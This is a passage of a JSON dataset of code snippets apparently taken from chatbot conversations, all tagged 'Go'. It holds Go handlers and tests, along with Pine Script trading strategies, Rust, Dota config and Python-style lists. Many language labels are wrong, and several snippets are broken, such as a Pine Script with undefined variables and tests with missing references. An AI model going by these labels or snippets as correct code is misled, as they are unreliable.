    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "func handleFileUpdate(w http.ResponseWriter, r *http.Request) {\n    if r.Method == http.MethodPut {\n        id := strings.TrimPrefix(r.URL.Path, \"/update/\")\n        objectID, err := primitive.ObjectIDFromHex(id)\n        if err != nil {\n            http.Error(w, \"Недопустимый id файла\", http.StatusBadRequest)\n            return\n        }\n\n        var result bson.M\n        err = collection.FindOne(context.Background(), bson.M{\"_id\": objectID}).Decode(&result)\n        if err != nil {\n            http.Error(w, \"Файл не найден\", http.StatusNotFound)\n            return\n        }\n\n        file, _, err := r.FormFile(\"file\")\n        if err != nil {\n            http.Error(w, err.Error(), http.StatusInternalServerError)\n            return\n        }\n        defer file.Close()\n\n        data, err := ioutil.ReadAll(file)\n        if err != nil {\n            http.Error(w, err.Error(), http.StatusInternalServerError)\n            return\n        }\n\n        _, err = collection.UpdateOne(\n            context.Background(),\n            bson.M{\"_id\": objectID},\n            bson.M{\"$set\": bson.M{\"data\": data}},\n        )\n        if err != nil {\n            http.Error(w, err.Error(), http.StatusInternalServerError)\n            return\n        }\n\n        fmt.Fprintln(w, \"Файл успешно обновлен!\")\n    } else {\n        http.Error(w, \"Метод не поддерживается\", http.StatusMethodNotAllowed)\n    }\n}",
    "filename": "0251e8e63f0a90f3ff210915ed36e805_0.go"
  },
  {
    "conversation_hash": "6d3315223a270be44f51de104cf87632",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "calcularCotizacion() {\n  // Aquí va el código de la función calcularCotizacion()\n}\n\nreservarServicio() {\n  // Aquí va el código de la función reservarServicio()\n}",
    "filename": "6d3315223a270be44f51de104cf87632_1.go"
  },
  {
    "conversation_hash": "2245a11e70a7192689c8b2dad653bbb2",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "func validateTnPort2ForDirectConnection(connection string, bridge string, names []string) validation.RuleFunc {\n    if connection == \"Direct\" && bridge == \"No\" && len(names) == 1 {\n        return func(value interface{}) error {\n            return nil\n        }\n    }\n    return func(value interface{}) error {\n        return validation.Validate(\n            value,\n            validation.Required,\n            validation.In(validEranPorts...),\n        )\n    }\n}",
    "filename": "2245a11e70a7192689c8b2dad653bbb2_0.go"
  },
  {
    "conversation_hash": "2245a11e70a7192689c8b2dad653bbb2",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func validateTnPort2ForDirectConnection(connection string, bridge string, names []string) validation.RuleFunc {\n\tif connection == \"Direct\" && bridge == \"No\" && len(names) == 2 {\n\t\treturn func(value interface{}) error {\n\t\t\treturn validation.Validate(\n\t\t\t\tvalue,\n\t\t\t\tvalidation.Required,\n\t\t\t\tvalidation.In(validEranPorts...),\n\t\t\t)\n\t\t}\n\t}\n\treturn func(value interface{}) error {\n\t\treturn nil\n\t}\n}",
    "filename": "2245a11e70a7192689c8b2dad653bbb2_1.go"
  },
  {
    "conversation_hash": "2245a11e70a7192689c8b2dad653bbb2",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "func validateTnPort2ForDirectConnection(connection string, bridge string, names []string) validation.RuleFunc {\n\tif connection == \"Direct\" && bridge == \"No\" && len(names) == 2 {\n\t\treturn func(value interface{}) error {\n\t\t\treturn validation.Validate(\n\t\t\t\tvalue,\n\t\t\t\tvalidation.Required,\n\t\t\t\tvalidation.In(validEranPorts...),\n\t\t\t)\n\t\t}\n\t}\n\treturn func(value interface{}) error {\n\t\treturn nil\n\t}\n}",
    "filename": "2245a11e70a7192689c8b2dad653bbb2_2.go"
  },
  {
    "conversation_hash": "8ced09324fa633941c111ac321a0dd19",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "\"Modifiers\"\n{\n    \"modifier_prevent_self_cast\"\n    {\n        \"IsHidden\" \"1\"\n        \"IsBuff\" \"1\"\n        \"RemoveOnDeath\" \"0\"\n        \"OnAbilityPhaseStart\"\n        {\n            \"RunScript\"\n            {\n                \"ScriptFile\" \"scripts/vscripts/modifiers/modifier_prevent_self_cast.lua\"\n                \"Function\" \"PreventSelfCast\"\n            }\n        }\n    }\n}",
    "filename": "8ced09324fa633941c111ac321a0dd19_2.go"
  },
  {
    "conversation_hash": "68ffee503d2d54968d3f488439332b0b",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5 \nstrategy(\"Estrategia para Maximizar Ganancias con Indicador de Momentum y Filtro de Tendencia\", overlay=true)\n\n// Parámetros \nfastLength = input(10, title=\"Longitud Media Móvil Rápida\") \nslowLength = input(20, title=\"Longitud Media Móvil Lenta\") \natrMultiplier = input(4.0, title=\"Multiplicador ATR\") // Aumentar el multiplicador \natrTrailMultiplier = input(1.5, title=\"Multiplicador Stop Móvil\") // Aumentar el multiplicador Stop Móvil\nmomentumPeriod = input(14, title=\"Período de Momentum\")\ntrendFilterPeriod = input(50, title=\"Período del Filtro de Tendencia\")\n\n// Indicadores \nfastMa = ta.sma(close, fastLength) \nslowMa = ta.sma(close, slowLength) \natr = ta.atr(14)\n[macdLine, signalLine, _] = ta.macd(close)\nmomentum = ta.mom(close, momentumPeriod)\ntrendFilter = ta.sma(close, trendFilterPeriod)\n\n// Señales de compra y venta \nbuySignal = ta.crossover(fastMa, slowMa) and momentum > 0 and close > trendFilter\nsellSignal = ta.crossunder(fastMa, slowMa) and momentum < 0 and close < trendFilter\n\n// Tamaño de la operación basado en ATR \ntradeSize = (close * atrMultiplier / atr) * (1 - 0.0002)\n\n// Condiciones de entrada y salida \nif buySignal\n    strategy.entry(\"Long\", strategy.long, qty = tradeSize) \nif sellSignal\n    strategy.entry(\"Short\", strategy.short, qty = tradeSize) \n\nif strategy.position_size > 0\n    trailingStop = strategy.trailing(\"Take Profit/Stop Loss\", \"Long\", trail_points = atrTrailMultiplier * atr)\n    strategy.exit(\"Take Profit/Stop Loss\", \"Long\", stop=close - trailingsStop)\nif strategy.position_size < 0\n    trailingStop = strategy.trailing(\"Take Profit/Stop Loss\", \"Short\", trail_points = atrTrailMultiplier * atr)\n    strategy.exit(\"Take Profit/Stop Loss\", \"Short\", stop=close + trailingsStop)\n\n// Estadísticas \ntotalTrades = strategy.closedtrades \nwinningTrades = strategy.wintrades \ntotalProfit = strategy.netprofit\n\n// Cálculo de estadísticas adicionales \nwinRate = winningTrades / totalTrades * 100 \naverageProfitPerTrade = totalProfit / totalTrades\n\n// Plotting \nplot(momentum, title=\"Momentum\", color=color.blue)\nplot(trendFilter, title=\"Filtro de Tendencia\", color=color.orange)\n\nplotshape(buySignal, title=\"Señal de Compra\", location=location.belowbar, color=color.green, size=size.small)\nplotshape(sellSignal, title=\"Señal de Venta\", location=location.abovebar, color=color.red, size=size.small)\n\n// Estadísticas \nplotshape(totalTrades, \"Total Operaciones: \" + tostring(totalTrades), location=location.belowbar, color=color.black, textcolor=color.white, style=shape.labelup) \nplotshape(winningTrades, \"Operaciones Ganadoras: \" + tostring(winningTrades) + \" (\" + tostring(winRate, \"#.#\") + \"%)\", location=location.belowbar, color=color.green, textcolor=color.white, style=shape.labelup) \nplotshape(averageProfitPerTrade, \"Beneficio Promedio por Operación: \" + tostring(averageProfitPerTrade, \"#.###\"), location=location.belowbar, color=color.blue, textcolor=color.white, style=shape.labelup)",
    "filename": "68ffee503d2d54968d3f488439332b0b_4.go"
  },
  {
    "conversation_hash": "cc691b7579c849175878a5252b666bdd",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nstrategy(\"Simple Moving Average Crossover\", overlay=true)\n\n// Define your moving averages\nfastLength = input(9, title=\"Fast Moving Average\")\nslowLength = input(21, title=\"Slow Moving Average\")\n\n// Calculate moving averages\nfastMA = ta.sma(close, fastLength)\nslowMA = ta.sma(close, slowLength)\n\n// Plot moving averages\nplot(fastMA, title=\"Fast MA\", color=color.blue)\nplot(slowMA, title=\"Slow MA\", color=color.red)\n\n// Generate buy and sell signals\nlongCondition = ta.crossover(fastMA, slowMA)\nif longCondition\n    strategy.entry(\"Long\", strategy.long)\n\nshortCondition = ta.crossunder(fastMA, slowMA)\nif shortCondition\n    strategy.close(\"Long\")\n\n// Example of a simple stop loss and take profit\nstopLoss = input(1.5, title=\"Stop Loss %\") / 100\ntakeProfit = input(3, title=\"Take Profit %\") / 100\n\nif strategy.position_size > 0\n    strategy.exit(\"Exit Long\", \"Long\", stop=close * (1 - stopLoss), limit=close * (1 + takeProfit))",
    "filename": "cc691b7579c849175878a5252b666bdd_0.go"
  },
  {
    "conversation_hash": "cc691b7579c849175878a5252b666bdd",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nstrategy(\"SuperTrend Trailing Stop\", overlay=true)\n\n// SuperTrend settings\natrPeriod = input(10, title=\"ATR Period\")\nmultiplier = input(3.0, title=\"ATR Multiplier\")\n\n// Get the ATR and calculate the SuperTrend\natr = ta.atr(atrPeriod)\nupperBand = ta.hline(high - (multiplier * atr))\nlowerBand = ta.hline(low + (multiplier * atr))\n\nvar float superTrend = na\nvar int trendDirection = 1\n\n// Determine the SuperTrend value and the trend direction\nif not na(superTrend[1])\n    if close[1] > superTrend[1]\n        superTrend := max(upperBand, superTrend[1])\n        trendDirection := 1\n    else\n        superTrend := min(lowerBand, superTrend[1])\n        trendDirection := -1\nelse\n    superTrend := upperBand\n    trendDirection := 1\n\nif trendDirection == -1 and close > superTrend\n    superTrend := upperBand\n    trendDirection := 1\nelse if trendDirection == 1 and close < superTrend\n    superTrend := lowerBand\n    trendDirection := -1\n\n// Plot SuperTrend\nplot(superTrend, color=(trendDirection > 0 ? color.green : color.red), linewidth=2, title=\"SuperTrend\")\n\n// Strategy order conditions based on SuperTrend\nlongCondition = trendDirection == 1 and close > superTrend\nif longCondition\n    strategy.entry(\"Long\", strategy.long)\n\nshortCondition = trendDirection == -1 and close < superTrend\nif shortCondition\n    strategy.close(\"Long\")\n\n// Set up trailing stop using the SuperTrend\nif strategy.position_size > 0\n    strategy.exit(\"Trailing Stop\", \"Long\", stop=superTrend)",
    "filename": "cc691b7579c849175878a5252b666bdd_1.go"
  },
  {
    "conversation_hash": "ac7f82837050ad7fc9e8844c4df47c17",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "struct User {\n       username: String,\n       email: String,\n       sign_in_count: u64,\n       active: bool,\n   }",
    "filename": "ac7f82837050ad7fc9e8844c4df47c17_2.go"
  },
  {
    "conversation_hash": "8d033c38d0d27df8adc5c6af325f21a6",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "import (\n\t\"testing\"\n\t\"github.com/stretchr/testify/assert\"\n\t\"github.com/stretchr/testify/mock\"\n\t\"github.com/stretchr/testify/require\"\n)\n\ntype MockSnapshotCache struct {\n\tmock.Mock\n}\n\nfunc (m *MockSnapshotCache) SetSnapshot(ctx context.Context, nodeID string, snapshot cache.Snapshot) error {\n\targs := m.Called(ctx, nodeID, snapshot)\n\treturn args.Error(0)\n}\n\nfunc TestAddOrUpdateVirtualHost(t *testing.T) {\n\t// 创建一个断言对象\n\tassert := assert.New(t)\n\trequire := require.New(t)\n\n\t// 准备测试数据\n\tvh := &route.VirtualHost{\n\t\tName: \"virtualhost1\",\n\t\t// 设置其他属性\n\t}\n\n\trouteName := \"route1\"\n\texpectedError := fmt.Errorf(\"unknown route config name: %s\", routeName)\n\n\t// 创建一个Mock的SnapshotCache对象\n\tcache := new(MockSnapshotCache)\n\n\t// 设置断言\n\tcache.On(\"SetSnapshot\", mock.Anything, mock.Anything, mock.Anything).Return(nil).Once()\n\n\t// 调用被测试的函数\n\terr := AddOrUpdateVirtualHost(vh, routeName, cache)\n\n\t// 验证断言\n\tcache.AssertExpectations(t)\n\tassert.NoError(err)\n\trequire.NotNil(snapshot.Resources[types.Route])\n\tassert.Equal(\"1\", snapshot.Resources[types.Route].Version)\n}",
    "filename": "8d033c38d0d27df8adc5c6af325f21a6_0.go"
  },
  {
    "conversation_hash": "8d033c38d0d27df8adc5c6af325f21a6",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "import (\n\t\"testing\"\n\n\t\"github.com/stretchr/testify/assert\"\n)\n\nfunc TestGenerateSnapshot(t *testing.T) {\n\t// 创建一个断言对象\n\tassert := assert.New(t)\n\n\trouteName := \"route1\"\n\n\t// 调用被测试的函数\n\tsnapshot := GenerateSnapshot(routeName)\n\n\t// 验证结果\n\tassert.Equal(\"1\", snapshot.Version)\n\n\trouteResources := snapshot.Resources[types.Route]\n\tassert.Len(routeResources.Items, 1)\n\n\trouteConfig := routeResources.Items[routeName].Resource.(*route.RouteConfiguration)\n\tassert.NotNil(routeConfig)\n\n\t// 验证其他资源类型\n\tassert.Empty(snapshot.Resources[types.Cluster])\n\tassert.Empty(snapshot.Resources[types.Endpoint])\n}",
    "filename": "8d033c38d0d27df8adc5c6af325f21a6_1.go"
  },
  {
    "conversation_hash": "8d033c38d0d27df8adc5c6af325f21a6",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "import (\n\t\"testing\"\n\n\t\"github.com/stretchr/testify/assert\"\n\t\"your-package-path/zchainv1alpha1\"\n)\n\nfunc TestMakeVirtualHost(t *testing.T) {\n\t// 创建一个断言对象\n\tassert := assert.New(t)\n\n\t// 准备测试数据\n\tdr := &zchainv1alpha1.ZPPCDomainRoute{\n\t\tSpec: zchainv1alpha1.ZPPCDomainRouteSpec{\n\t\t\tSource:      \"source\",\n\t\t\tDestination: \"destination\",\n\t\t},\n\t}\n\n\t// 调用被测试的函数\n\tvirtualHost := MakeVirtualHost(dr)\n\n\t// 验证结果\n\texpectedName := \"source-to-destination-route\"\n\tassert.Equal(expectedName, virtualHost.Name)\n\n\texpectedDomains := []string{\"*.destination.svc\"}\n\tassert.Equal(expectedDomains, virtualHost.Domains)\n\n\texpectedRoutes := []*route.Route{{\n\t\tMatch: &route.RouteMatch{\n\t\t\tPathSpecifier: &route.RouteMatch_Prefix{\n\t\t\t\tPrefix: \"/\",\n\t\t\t},\n\t\t},\n\t\tAction: &route.Route_Route{\n\t\t\tRoute: &route.RouteAction{\n\t\t\t\tClusterSpecifier: &route.RouteAction_Cluster{\n\t\t\t\t\tCluster: GenerateClusterName(dr.Spec.Source, dr.Spec.Destination),\n\t\t\t\t},\n\t\t\t},\n\t\t},\n\t}}\n\tassert.Equal(expectedRoutes, virtualHost.Routes)\n}",
    "filename": "8d033c38d0d27df8adc5c6af325f21a6_2.go"
  },
  {
    "conversation_hash": "86c51b9ac96e905fbf71a4ec9a3744ce",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"testing\"\n\n\t\"github.com/stretchr/testify/assert\"\n)\n\nfunc TestGenerateTransportSocket(t *testing.T) {\n\t// 创建一个测试用的conf对象\n\tconf := &anypb.Any{}\n\n\t// 调用函数并获取返回值\n\tresult := generateTransportSocket(conf)\n\n\t// 验证生成的TransportSocket是否符合预期\n\tassert.NotNil(t, result)\n\tassert.Equal(t, \"envoy.transport_sockets.tls\", result.Name)\n\tassert.Equal(t, conf, result.GetTypedConfig())\n}",
    "filename": "86c51b9ac96e905fbf71a4ec9a3744ce_0.go"
  },
  {
    "conversation_hash": "86c51b9ac96e905fbf71a4ec9a3744ce",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"testing\"\n\n\t\"github.com/stretchr/testify/assert\"\n)\n\nfunc TestGenerateUpstreamTLSConfig(t *testing.T) {\n\t// 创建测试用的证书和 CA 数据\n\tcert := []byte(\"test certificate\")\n\tca := []byte(\"test ca\")\n\n\t// 调用函数并获取返回值\n\tresult, err := GenerateUpstreamTLSConfig(cert, ca)\n\n\t// 验证返回值是否符合预期\n\tassert.NoError(t, err)\n\tassert.NotNil(t, result)\n\tassert.Equal(t, \"envoy.transport_sockets.tls\", result.Name)\n\n\t// 获取生成的TransportSocket的TypedConfig\n\ttlsConfig := result.GetTypedConfig()\n\tassert.NotNil(t, tlsConfig)\n\n\t// 验证tlsConfig.CommonTlsContext.TlsCertificates是否符合预期\n\ttlsCertificates := tlsConfig.GetCommonTlsContext().GetTlsCertificates()\n\tassert.NotNil(t, tlsCertificates)\n\tassert.Len(t, tlsCertificates, 1)\n\tassert.Equal(t, \"test certificate\", tlsCertificates[0].GetCertificateChain().GetInlineString())\n\n\t// 验证tlsConfig.CommonTlsContext.ValidationContextType是否符合预期\n\tvalidationContext := tlsConfig.GetCommonTlsContext().GetValidationContextType()\n\tassert.NotNil(t, validationContext)\n\tassert.Equal(t, \"test ca\", validationContext.GetValidationContext().GetTrustedCa().GetInlineString())\n}",
    "filename": "86c51b9ac96e905fbf71a4ec9a3744ce_2.go"
  },
  {
    "conversation_hash": "86c51b9ac96e905fbf71a4ec9a3744ce",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"testing\"\n\n\t\"github.com/stretchr/testify/assert\"\n\t\"google.golang.org/protobuf/types/known/durationpb\"\n)\n\nfunc TestMakeCluster(t *testing.T) {\n\t// 创建一个测试用的ZPPCDomainRoute对象和TransportSocket对象\n\tdr := &zchainv1alpha1.ZPPCDomainRoute{\n\t\tSpec: zchainv1alpha1.ZPPCDomainRouteSpec{\n\t\t\tSource:      \"source\",\n\t\t\tDestination: \"destination\",\n\t\t\tEndpoints: []zchainv1alpha1.Endpoint{\n\t\t\t\t{\n\t\t\t\t\tHost: \"localhost\",\n\t\t\t\t\tPort: 8080,\n\t\t\t\t},\n\t\t\t},\n\t\t},\n\t}\n\ttransportSocket := &core.TransportSocket{\n\t\tName: \"envoy.transport_sockets.tls\",\n\t}\n\n\t// 调用函数并获取返回值\n\tresult := MakeCluster(dr, transportSocket)\n\n\t// 验证返回值是否符合预期\n\tassert.NotNil(t, result)\n\tassert.Equal(t, \"source_destination\", result.Name)\n\tassert.Equal(t, durationpb.New(5*time.Second), result.ConnectTimeout)\n\tassert.Equal(t, envoycluster.Cluster_STRICT_DNS, result.GetClusterDiscoveryType().GetType())\n\tassert.Equal(t, envoycluster.Cluster_ROUND_ROBIN, result.LbPolicy)\n\tassert.Equal(t, envoycluster.Cluster_V4_ONLY, result.DnsLookupFamily)\n\tassert.NotNil(t, result.GetLoadAssignment())\n\tassert.Len(t, result.GetLoadAssignment().Endpoints, 1)\n\tassert.Len(t, result.GetLoadAssignment().Endpoints[0].LbEndpoints, 1)\n\tassert.Equal(t, \"localhost\", result.GetLoadAssignment().Endpoints[0].LbEndpoints[0].GetEndpoint().GetAddress().GetSocketAddress().GetAddress())\n\tassert.Equal(t, uint32(8080), result.GetLoadAssignment().Endpoints[0].LbEndpoints[0].GetEndpoint().GetAddress().GetSocketAddress().GetPortSpecifier().GetPortValue())\n\n\tassert.Equal(t, \"envoy.transport_sockets.tls\", result.TransportSocket.GetName())\n\tassert.NotNil(t, result.TransportSocket.GetConfigType())\n\tassert.NotNil(t, result.TransportSocket.GetConfigType().GetTypedConfig())\n}",
    "filename": "86c51b9ac96e905fbf71a4ec9a3744ce_4.go"
  },
  {
    "conversation_hash": "86c51b9ac96e905fbf71a4ec9a3744ce",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"testing\"\n\n\t\"github.com/stretchr/testify/assert\"\n)\n\nfunc TestDeleteCluster(t *testing.T) {\n\t// 创建一个测试用的name和锁对象\n\tname := \"test_cluster\"\n\tlock := &sync.Mutex{}\n\n\t// 模拟一个简单的snapshotCache和snapshot\n\tsnapshotCache := &cache.SnapshotCache{}\n\tsnapshot := &envoycachev3.Snapshot{\n\t\tResources: make(map[string]envoycachev3.Resources),\n\t}\n\tsnapshot.Resources[types.Cluster] = envoycachev3.Resources{\n\t\tItems: map[string]envoycachev3.Resource{\n\t\t\tname: {},\n\t\t},\n\t\tVersion: \"1\",\n\t}\n\n\t// 调用函数并获取返回值\n\terr := DeleteCluster(name, lock, snapshotCache, snapshot)\n\n\t// 验证函数执行是否成功，即返回值是否为nil\n\tassert.NoError(t, err)\n\n\t// 验证删除后的snapshot是否符合预期\n\tclusters := snapshot.Resources[types.Cluster].Items\n\t_, found := clusters[name]\n\tassert.False(t, found)\n\n\tversion, _ := strconv.Atoi(snapshot.Resources[types.Cluster].Version)\n\tassert.Equal(t, \"2\", fmt.Sprintf(\"%d\", version))\n}",
    "filename": "86c51b9ac96e905fbf71a4ec9a3744ce_6.go"
  },
  {
    "conversation_hash": "86c51b9ac96e905fbf71a4ec9a3744ce",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"testing\"\n\n\t\"github.com/stretchr/testify/assert\"\n)\n\nfunc TestAddOrUpdateEndpoint(t *testing.T) {\n\t// 创建一个测试用的ClusterLoadAssignment对象和锁对象\n\tconf := &endpoint.ClusterLoadAssignment{\n\t\tClusterName: \"test_cluster\",\n\t}\n\tlock := &sync.Mutex{}\n\n\t// 模拟一个简单的snapshotCache和snapshot\n\tsnapshotCache := &cache.SnapshotCache{}\n\tsnapshot := &envoycachev3.Snapshot{\n\t\tResources: make(map[string]envoycachev3.Resources),\n\t}\n\tsnapshot.Resources[types.Endpoint] = envoycachev3.Resources{\n\t\tItems: map[string]envoycachev3.Resource{\n\t\t\tconf.ClusterName: {},\n\t\t},\n\t\tVersion: \"1\",\n\t}\n\n\t// 调用函数并获取返回值\n\terr := AddOrUpdateEndpoint(conf, lock, snapshotCache, snapshot)\n\n\t// 验证函数执行是否成功，即返回值是否为nil\n\tassert.NoError(t, err)\n\n\t// 验证添加或更新后的snapshot是否符合预期\n\tendpoints := snapshot.Resources[types.Endpoint].Items\n\tresource, found := endpoints[conf.ClusterName]\n\tassert.True(t, found)\n\tassert.Equal(t, conf, resource.Resource)\n\n\tversion, _ := strconv.Atoi(snapshot.Resources[types.Endpoint].Version)\n\tassert.Equal(t, \"2\", fmt.Sprintf(\"%d\", version))\n}",
    "filename": "86c51b9ac96e905fbf71a4ec9a3744ce_8.go"
  },
  {
    "conversation_hash": "86c51b9ac96e905fbf71a4ec9a3744ce",
    "code_index": 10,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"testing\"\n\n\t\"github.com/stretchr/testify/assert\"\n)\n\nfunc TestDeleteVirtualHost(t *testing.T) {\n\t// 创建一个测试用的name和routeName，以及锁对象\n\tname := \"test_virtual_host\"\n\trouteName := \"test_route\"\n\tlock := &sync.Mutex{}\n\n\t// 模拟一个简单的snapshotCache和snapshot\n\tsnapshotCache := &cache.SnapshotCache{}\n\tsnapshot := &envoycachev3.Snapshot{\n\t\tResources: make(map[string]envoycachev3.Resources),\n\t}\n\tsnapshot.Resources[types.Route] = envoycachev3.Resources{\n\t\tItems: map[string]envoycachev3.Resource{\n\t\t\trouteName: {\n\t\t\t\tResource: &route.RouteConfiguration{\n\t\t\t\t\tVirtualHosts: []*route.VirtualHost{\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tName: name,\n\t\t\t\t\t\t},\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tName: \"other_virtual_host\",\n\t\t\t\t\t\t},\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t},\n\t\t},\n\t\tVersion: \"1\",\n\t}\n\n\t// 调用函数并获取返回值\n\terr := DeleteVirtualHost(name, routeName, lock, snapshotCache, snapshot)\n\n\t// 验证函数执行是否成功，即返回值是否为nil\n\tassert.NoError(t, err)\n\n\t// 验证删除后的snapshot是否符合预期\n\troutes := snapshot.Resources[types.Route].Items\n\trs, found := routes[routeName]\n\tassert.True(t, found)\n\n\trouteConfig, ok := rs.Resource.(*route.RouteConfiguration)\n\tassert.True(t, ok)\n\tassert.Len(t, routeConfig.VirtualHosts, 1)\n\tassert.NotEqual(t, name, routeConfig.VirtualHosts[0].Name)\n\n\tversion, _ := strconv.Atoi(snapshot.Resources[types.Route].Version)\n\tassert.Equal(t, \"2\", fmt.Sprintf(\"%d\", version))\n}",
    "filename": "86c51b9ac96e905fbf71a4ec9a3744ce_10.go"
  },
  {
    "conversation_hash": "9ee1e4b45fa03f26c8e186fde9a073bb",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "# ... Previous items above\n    \"boy drawing chalk\", \"group at dinner\", \"woman at gym\",\n    \"couple studying together\", \"friends watching cricket\", \"children during storytime\",\n    \"people on boat tour\", \"woman shopping clothes\", \"man at barbershop\",\n    \"family bowling night\", \"friends making pottery\", \"children with puppies\",\n    \"couple watching opera\", \"people at poetry reading\", \"woman feeding baby\",\n    \"group playing foosball\", \"family riding train\", \"couple at waterfall\",\n    \"friends at skateboard park\", \"man teaching music\", \"children at waterpark\",\n    \"people at election\", \"woman at waterfall\", \"family carving pumpkins\",\n    \"friends crafting together\", \"children playing dominoes\", \"couple building furniture\",\n    \"people at quiz night\", \"group at pottery studio\", \"woman at flea market\",\n    \"man at cocktail party\", \"kids playing softball\", \"friends taking road trip\",\n    \"woman doing aerobics\", \"family apple orchard\", \"children at science museum\",\n    \"group catching fish\", \"friends watching marathon\", \"woman teaching art\",\n    \"man at gym\", \"couple at music festival\", \"children at pumpkin patch\",\n    \"people playing paintball\", \"family at monument\", \"friends attending gala\",\n    \"boy playing guitar\", \"group sunbathing beach\", \"family at botanical garden\",\n    \"woman doing pilates\", \"friends watching basketball\", \"kids riding scooters\",\n    \"couple at masquerade\", \"people at food festival\", \"team playing volleyball\",\n    \"children jumping puddles\", \"woman drinking coffee\", \"man reading newspaper\",\n    \"family camping forest\", \"friends at parade\", \"children building legos\",\n    \"couple at tea house\", \"people hiking mountains\", \"group playing trivia\",\n    \"woman at bakery\", \"kids at skating rink\", \"family at breakfast\",\n    \"couple drawing art\", \"man playing dominoes\", \"friends at costume ball\",\n    \"children hunting treasure\", \"woman at pottery wheel\", \"group eating dinner\",\n    \"couple playing arcade\", \"family baking cookies\", \"kids riding horses\",\n    \"man juggling balls\", \"woman at computer\", \"group playing monopoly\",\n    \"couple in bookstore\", \"people at flea market\", \"children playing jigsaw\",\n    \"friends at bonfire\", \"woman knitting sweater\", \"man at piano recital\",\n    \"family at soccer game\", \"people playing bocce ball\", \"children wearing pajamas\",\n    \"friends at baby shower\", \"woman at boot camp\", \"family at brunch\",\n    \"people sipping cocktails\", \"boy playing with dog\", \"group at virtual reality\",\n    \"friends at escape room\", \"woman at fashion show\", \"team playing darts\",\n    \"children baking cupcakes\", \"couple at salsa club\", \"kids playing laser tag\",\n    \"man at the wheel\", \"family attending mass\", \"group on segway tour\",\n    \"friends playing poker\", \"woman at florist\", \"children in a parade\",\n    \"couple having breakfast\", \"family at paddle boarding\", \"group trick-or-treating\",\n    \"kids playing hopscotch\", \"man doing crossfit\", \"people at history museum\",\n    \"woman typing laptop\", \"group tasting cheese\", \"children at daycare\",\n    \"couple attending lecture\", \"family at amusement park\", \"friends cider tasting\",\n    \"woman busking street\", \"kids on bumper cars\", \"people at yoga retreat\",\n    \"family at RV camp\", \"couple at flea market\", \"man practicing judo\",\n    \"children sharing ice cream\", \"friends at graduation\", \"woman at hair salon\",\n    \"family watching game show\", \"group at open mic\", \"couple preparing meal\",\n    \"children on a field\", \"people on a cruise\", \"group in an aerobics class\",\n    \"friends making pasta\", \"woman at a book signing\", \"kids at a dog show\",\n    \"couple doing gardening\", \"people at meditation retreat\", \"friends at a film festival\",\n    \"family at an art gallery\", \"man teaching robotics\", \"kids on a museum tour\",\n    \"group at a petting zoo\", \"couple in a hot air balloon\", \"friends cooking outdoors\",\n    \"woman at a quilt show\", \"people on a mountain hike\", \"kids at a soccer clinic\",\n    \"group in a dance class\", \"family on a city tour\", \"woman having a picnic\",\n    \"friends at a board game night\", \"children playing in leaves\", \"couple at beach cleanup\",\n    \"people biking together\", \"woman at animal shelter\", \"family in a greenhouse\",\n    \"friends on a fishing trip\", \"group at a tech convention\", \"couple ice fishing\",\n    \"woman practicing martial arts\", \"kids decorating gingerbread houses\", \"family adopting pet\",\n    \"man hosting podcast\", \"people at brewery tour\", \"group in a drum circle\",\n    \"friends at a protest\", \"woman planting trees\", \"children at a book fair\",\n    \"couple dancing under stars\", \"people at a garage sale\", \"kids at a cooking class\",\n    \"group having a picnic\", \"friends at a craft fair\", \"man kayaking river\",\n    \"woman at a car show\", \"family on a train ride\", \"couple playing table tennis\",\n    \"group watching a street performer\", \"friends at an open-air market\", \"children on pony rides\",\n    \"woman photographing nature\", \"family on a boat excursion\", \"man attending a tech talk\",\n    \"people at an improv show\", \"woman at a language class\", \"kids at a robotics competition\"\n    # ... Continue expanding until you reach 1000 items.\n]",
    "filename": "9ee1e4b45fa03f26c8e186fde9a073bb_1.go"
  },
  {
    "conversation_hash": "4a9a15a51f51881ca8c20d1d49f651ea",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/csv\"\n\t\"fmt\"\n\t\"io\"\n\t\"log\"\n\t\"os\"\n)\n\nfunc main() {\n\t// Open the CSV file\n\tfile, err := os.Open(\"stocks.csv\")\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer file.Close()\n\n\t// Create a new CSV reader\n\treader := csv.NewReader(file)\n\n\t// Read the column names\n\tcolumns, err := reader.Read()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// Validate the column names\n\texpectedColumns := []string{\"date\", \"open stock price\", \"last price\"}\n\tif !equalSlices(columns, expectedColumns) {\n\t\tlog.Fatalf(\"Invalid column names. Expected: %v, Received: %v\", expectedColumns, columns)\n\t}\n\n\t// Read and process the data lines\n\tfor {\n\t\tline, err := reader.Read()\n\t\tif err == io.EOF {\n\t\t\tbreak\n\t\t} else if err != nil {\n\t\t\tlog.Fatal(err)\n\t\t}\n\n\t\tfmt.Printf(\"Date: %s\\nOpen Stock Price: %s\\nLast Price: 